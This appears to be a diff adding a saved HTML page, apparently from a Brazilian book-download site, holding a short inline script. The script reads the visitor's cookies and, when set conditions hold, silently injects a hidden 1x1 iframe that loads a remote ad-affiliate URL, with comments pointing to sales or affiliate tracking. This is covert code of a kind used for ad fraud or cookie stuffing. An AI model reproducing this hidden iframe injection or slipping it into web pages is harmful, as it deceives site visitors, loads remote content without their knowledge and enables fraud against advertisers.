@@ -1,0 +1,36 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1252"><script src="routes_arquivos/lelivros2.js" type="text/javascript"></script><script src="routes_arquivos/npbr.js" type="text/javascript"></script></head><body>
+<script type="text/javascript">
+
+function getCookiea(c_name) {
+    if (document.cookie.length > 0) {
+        c_start = document.cookie.indexOf(c_name + "=");
+        if (c_start != -1) {
+            c_start = c_start + c_name.length + 1;
+            c_end = document.cookie.indexOf(";", c_start);
+            if (c_end == -1) {
+                c_end = document.cookie.length;
+            }
+            return unescape(document.cookie.substring(c_start, c_end));
+        }
+    }
+    return "empty";
+}
+if (parent.window.location==top.window.location)
+{
+	if (getCookiea("visited")!="empty" && getCookiea("visited")!="no" && getCookiea("expired")=="empty")
+	{
+
+	//alert (elafiliado);
+	//iframe de venta
+		ifrmv = document.createElement("iframe");
+		ifrmv.setAttribute("src", "https://yourads.website/php/check2.php");
+		ifrmv.style.width = 1+"px";
+		ifrmv.style.height = 1+"px";
+		ifrmv.style.display = "none";
+		document.body.appendChild(ifrmv);
+	}
+}
+</script>
+
+</body></html>
